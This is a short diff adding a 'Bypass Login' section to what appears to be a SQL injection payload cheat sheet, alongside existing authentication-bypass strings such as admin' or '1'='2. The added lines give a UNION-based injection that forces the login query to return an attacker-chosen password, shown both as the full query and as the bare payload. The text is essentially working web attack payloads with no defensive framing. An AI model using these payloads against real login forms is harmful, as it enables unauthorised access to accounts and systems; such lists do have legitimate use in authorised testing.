@@ -34,3 +34,9 @@ user user
 admin' or '
 admin' or '1'='2
 ```
+
+## Bypass Login
+```py
+SELECT password FROM admins WHERE username='admin' UNION SELECT '123' AS password#
+' UNION SELECT '123' AS password#
+```
